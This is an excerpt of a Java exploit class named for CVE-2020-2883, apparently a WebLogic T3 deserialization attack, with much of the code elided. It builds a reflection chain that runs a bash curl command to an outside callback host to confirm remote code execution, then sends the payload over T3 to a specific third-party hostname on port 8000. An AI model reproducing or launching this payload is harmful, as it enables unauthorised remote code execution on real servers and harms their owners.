...
public class CVE_2020_2883 {
    ...
    public static void main(String[] args) throws Exception {
        ...
        ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"/bin/bash", "-c", "curl http://rce.exfil.neolexbugbox.fr/success"}});
        ...
        T3ProtocolOperation.send("meet-jit-si-us-west-2b-s1-jvb-45-64-129.jitsi.net", "8000", payload);
